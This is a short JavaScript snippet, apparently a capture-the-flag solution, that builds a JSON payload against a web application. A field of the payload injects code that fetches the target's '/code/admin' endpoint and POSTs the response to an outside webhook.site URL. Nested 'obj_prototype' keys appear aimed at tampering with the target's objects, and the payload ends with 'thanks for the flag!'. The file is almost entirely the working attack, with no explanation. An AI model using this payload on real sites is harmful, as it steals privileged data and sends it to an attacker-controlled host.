let webhook = 'https://webhook.site/d2a3cab6-053e-455c-b03c-7ebe13a0e278'
console.log(JSON.stringify({
    "var_message": "Hello World",
    "var_Error":null,
    "func_Error":`fetch('/code/admin').then(resp=>resp.json().then(json=>fetch('${webhook}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(json)})))`,
    "obj_String":{
        "obj_prototype":{
            "var_split":null
        }
    },
    "var_gg":"thanks for the flag!"
}))
